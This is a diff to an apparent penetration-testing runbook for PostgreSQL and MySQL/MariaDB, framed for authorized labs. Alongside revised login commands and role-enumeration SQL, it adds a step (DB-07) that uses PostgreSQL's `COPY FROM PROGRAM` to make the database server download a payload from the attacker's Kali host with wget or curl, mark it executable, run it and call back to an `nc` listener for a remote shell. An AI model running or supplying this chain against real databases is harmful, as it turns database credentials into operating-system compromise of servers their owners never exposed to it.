@@ -2394,14 +2394,23 @@ Confirm the engine from its response before picking a client. One supplied ident
 
 ## DB-01. Can the assigned identity establish a database session?
 
-Non-TLS lab only:
+PostgreSQL from Kali, using the port reported by the scan:
 
 ```bash
-PGHOSTADDR='<TARGET_IP>' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '<TARGET_IP>' --port '<PORT>' --username '<USERNAME>' --dbname '<DB>'
+psql -h '<TARGET_IP>' -p '<PORT>' -U '<USERNAME>' -d postgres
+```
+
+MySQL or MariaDB in an explicitly non-TLS lab:
+
+```bash
 mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --port='<PORT>' --user='<USERNAME>' --password --disable-ssl
 ```
 
-For verified TLS use `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname, or `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a trust failure.
+`psql` prompts when the server requests a password and negotiates TLS when it is
+offered. For verified TLS use `PGSSLMODE=verify-full
+PGSSLROOTCERT='<CA>'` with the certificate hostname. For MariaDB use `--ssl
+--ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a
+trust failure.
 
 From a shell on the target, when the account is bound to loopback:
 
@@ -2413,7 +2422,8 @@ mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='127.0.0.1' --po
 
 | Result | Next |
 | --- | --- |
-| SQL prompt | **DB-02**. |
+| PostgreSQL `psql` prompt | **DB-19**. |
+| MySQL or MariaDB prompt | **DB-15**. |
 | Engine is MSSQL with an ODBC client | **DB-03**. |
 | Oracle listener identified | **DB-21**. |
 | Password or account denied | **NET-05**. |
@@ -2577,43 +2587,55 @@ An exposed listener with supplied or default credentials is the prerequisite.
 
 # postgresql
 
-Supplied-account PostgreSQL, or local peer access. Start at DB-18; DB-01 proves
-the endpoint first. `pg_read_server_files` and `pg_execute_server_program` decide
-the read and execute steps.
+Start at DB-18 from Kali with the host and port reported by the scan. Use the
+`postgres` database when no application database is known. After login, DB-19
+records the role and DB-07 tests whether it can run a server-side program.
 
-## DB-18. Can the observed PostgreSQL identity authenticate over socket or loopback?
+## DB-18. Can the observed PostgreSQL identity authenticate?
 
-Enter when DB-01 reached a PostgreSQL prompt, or a supplied role and one observed
-endpoint are both in scope.
+Enter with one observed PostgreSQL endpoint and one authorized role. When an
+authorized lab explicitly asks for default credentials, try the documented pair
+once. Do not spray password guesses.
 
-Question: Which local path does this role accept?
+From Kali, connect to the reported TCP port. This is the normal first command:
 
-Peer authentication over the socket, when the OS user matches a role:
+```bash
+psql -h '<TARGET_IP>' -p '<PORT>' -U postgres -d postgres
+```
+
+`-h` is the target, `-p` is the scan port, `-U` is the PostgreSQL role and `-d`
+is the initial database. Keep a nonstandard port such as `5437`. `psql` prompts
+for the password and negotiates TLS when the server offers it.
+
+Only from a shell on the target, try peer authentication over its Unix socket:
 
 ```bash
 psql -X -w -d postgres
 ```
 
-Supplied role over the socket, then loopback:
+Only from a shell on the target, use a supplied role over loopback:
 
 ```bash
-PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '/var/run/postgresql' --port='<PORT>' --username '<USERNAME>' --dbname '<DB>'
-PGHOSTADDR='127.0.0.1' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '127.0.0.1' --port='<PORT>' --username '<USERNAME>' --dbname '<DB>'
+psql -X -W -h '127.0.0.1' -p '<PORT>' -U '<USERNAME>' -d postgres
 ```
 
-`-W` prompts and `-w` never prompts; `PGPASSWORD` keeps the value out of `ps`.
-`127.0.0.1` only from a shell on the target.
+`-X` ignores the target account's `psql` startup file. `-W` prompts for a
+password and `-w` never prompts. A path such as `/var/run/postgresql` names a
+target-local Unix socket directory, not a remote host. Do not disable TLS merely
+to simplify the command.
 
 | Result | Next |
 | --- | --- |
 | `psql` prompt | **DB-19**. |
-| Password or role denied | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
-| TLS required | Add `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname. |
+| Password authentication failed | Recheck the one authorized role and password; otherwise **GAP-ACCESS**. |
+| No `pg_hba.conf` entry | This client address or TLS mode is not allowed; keep the denial and use **GAP-ACCESS**. |
+| Certificate or hostname failure | Use the assigned CA and certificate hostname; do not fall back to plaintext. |
 | Refused or timeout | **NET-03**. |
 
 ## DB-19. What does this PostgreSQL role expose?
 
-At a `psql` prompt, clear any unfinished input first:
+These commands run at a `psql` prompt such as `postgres=#`, not in Bash. Clear
+unfinished input first:
 
 ```text
 \r
@@ -2623,38 +2645,49 @@ At a `psql` prompt, clear any unfinished input first:
 unfinished; `\r` clears it. `SHOW DATABASES` is MySQL or MariaDB syntax.
 PostgreSQL uses `\l` to list databases, while SQL `SHOW` reads server settings.
 
-Inspect the session, databases, roles and schemas:
+List the current connection, databases and roles. Backslash commands do not end
+with a semicolon:
 
 ```text
 \conninfo
 \l+
 \du+
-\dn+
 ```
 
-Connect to each non-template database, then list and inspect its relations:
+Connect to each non-template database, then list its schemas and relations:
 
 ```text
 \c <DATABASE>
 \dn+
 \dt *.*
 \dv *.*
-\d <SCHEMA>.<TABLE>
-SELECT * FROM <SCHEMA>.<TABLE> LIMIT 20;
 ```
 
 `\dt` without a pattern only searches the current database and visible schemas.
 `template0` rejects normal connections by design, and `template1` is a creation
 template rather than an application database.
 
-Send each SQL statement separately:
+Describe one interesting table, then read a small sample:
+
+```text
+\d <SCHEMA>.<TABLE>
+```
+
+```sql
+SELECT * FROM <SCHEMA>.<TABLE> LIMIT 20;
+```
+
+Send each privilege and setting query separately. SQL statements end with a
+semicolon:
 
 ```sql
 SELECT current_user, session_user, version(), current_database(), inet_server_addr(), inet_server_port();
+SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles ORDER BY rolname;
 SELECT rolsuper, pg_has_role(current_user,'pg_read_server_files','USAGE'), pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
 SELECT datname FROM pg_database WHERE datallowconn ORDER BY datname;
 SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') LIMIT 40;
 SHOW data_directory;
+SHOW config_file;
 ```
 
 | Result | Next |
@@ -2664,6 +2697,85 @@ SHOW data_directory;
 | Superuser and writable data directory | **DB-20**. |
 | Application table with hashes | **PASS-02** offline. |
 | No server-file right | **GAP-SERVICE**. |
+
+## DB-07. Can this PostgreSQL role run a server-side command?
+
+Enter from DB-19 with `pg_execute_server_program` or superuser. Prove the server
+process identity before staging any file:
+
+```sql
+SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
+BEGIN;
+CREATE TEMP TABLE "proof_<ID>" (line text) ON COMMIT DROP;
+COPY pg_temp."proof_<ID>" FROM PROGRAM '/usr/bin/id';
+SELECT line FROM pg_temp."proof_<ID>";
+ROLLBACK;
+```
+
+If a shell is needed, check the server architecture and available download
+clients first:
+
+```sql
+CREATE TEMP TABLE "stage_<ID>" (line text);
+COPY pg_temp."stage_<ID>" FROM PROGRAM 'uname -m; command -v wget; command -v curl; command -v python3';
+SELECT line FROM pg_temp."stage_<ID>";
+```
+
+Generate a matching Linux payload at **PAY-02**. On Kali, record its hash, serve
+its directory and start the listener in a second terminal:
+
+```bash
+sha256sum payload.elf
+python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
+```
+
+```bash
+nc -lvnp '<LPORT>'
+```
+
+Back at the `psql` prompt, use only the downloader found above. These commands
+run as the PostgreSQL service account on the target:
+
+```sql
+TRUNCATE pg_temp."stage_<ID>";
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/wget -q http://<KALI_IP>:<HTTP_PORT>/payload.elf -O /tmp/owb-<ID>.elf';
+```
+
+Or, when `curl` is the available client:
+
+```sql
+TRUNCATE pg_temp."stage_<ID>";
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/curl -fsSL http://<KALI_IP>:<HTTP_PORT>/payload.elf -o /tmp/owb-<ID>.elf';
+```
+
+Verify the target copy, make it executable and run it:
+
+```sql
+TRUNCATE pg_temp."stage_<ID>";
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/sha256sum /tmp/owb-<ID>.elf';
+SELECT line FROM pg_temp."stage_<ID>";
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/bin/chmod 700 /tmp/owb-<ID>.elf';
+TRUNCATE pg_temp."stage_<ID>";
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/tmp/owb-<ID>.elf';
+```
+
+The last `COPY` may stay busy while the callback is open. Verify the new session
+at **EXP-03**, then enter the Linux lane at **LPRIV-01**. After closing the
+payload, remove only the staged file:
+
+```sql
+COPY pg_temp."stage_<ID>" FROM PROGRAM '/bin/rm -f /tmp/owb-<ID>.elf';
+DROP TABLE pg_temp."stage_<ID>";
+```
+
+| Result | Next |
+| --- | --- |
+| uid/gid output | Build a matching payload at **PAY-02**, then return here. |
+| Callback with the expected host and identity | **EXP-03**, then **LPRIV-01**. |
+| `Permission denied` on `PROGRAM` | **DB-19** for the exact role. |
+| Downloader missing or transfer fails | Keep the error; **PAUSE-COVERAGE**. |
+| `Permission denied` when executing the file | Check the path's mount at **LPRIV-10**. |
+| No callback | **EXP-02** with the raw listener and PostgreSQL output. |
 
 ## DB-08. Can the PostgreSQL account read one relevant server file?
 
@@ -2707,26 +2819,6 @@ otherwise from a shell.
 | Marker written | **DB-07** if an execute right exists, else the web branch. |
 | Existing file | Choose a new leaf; `COPY` overwrites without asking. |
 | Permission denied | **DB-19** for rights and directory. |
-
-## DB-07. Can this PostgreSQL role run a fixed server-side identity command?
-
-Enter from DB-19 with `pg_execute_server_program` or superuser.
-
-```sql
-SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
-BEGIN;
-CREATE TEMP TABLE "proof_<ID>" (line text) ON COMMIT DROP;
-COPY pg_temp."proof_<ID>" FROM PROGRAM '/usr/bin/id';
-SELECT line FROM pg_temp."proof_<ID>";
-ROLLBACK;
-```
-
-| Result | Next |
-| --- | --- |
-| uid/gid output, rolled back | **EXP-01** if a shell is needed. |
-| Permission denied | **DB-19**. |
-| No output or timeout | **PAUSE-COVERAGE**. |
-| Rollback unconfirmed | **PAUSE-RECOVERY**. |
 
 # mysql
 
@@ -6674,7 +6766,9 @@ Oracle returns identity and owned objects only, no OS command.
 
 ## DB-07. What decides this step?
 
-`COPY FROM PROGRAM` is an execution proof, not a shell.
+`COPY FROM PROGRAM` runs through the database server's operating-system account.
+Prove that identity before staging a payload. SQL rollback does not undo a
+download, callback or other external program effect.
 
 ## DB-08. What decides this step?
 
@@ -6714,11 +6808,15 @@ OS authentication depends on the shell's OS user, while a supplied account needs
 
 ## DB-18. What decides this step?
 
-Peer authentication maps the OS user to a role over the socket; a role without that mapping needs the supplied account over loopback.
+From Kali, `-h` names the target, `-p` preserves the observed port, `-U` names
+the role and `-d` selects the first database. Unix sockets and `127.0.0.1` are
+target-local alternatives, not remote connection forms.
 
 ## DB-19. What decides this step?
 
-Role attributes and memberships decide the read and execute steps; `data_directory` needs superuser or `pg_read_all_settings`.
+Backslash commands are `psql` client commands without semicolons. SQL statements
+use semicolons. Role attributes and memberships decide the read and execute
+steps; `data_directory` needs superuser or `pg_read_all_settings`.
 
 ## DB-20. What decides this step?
 
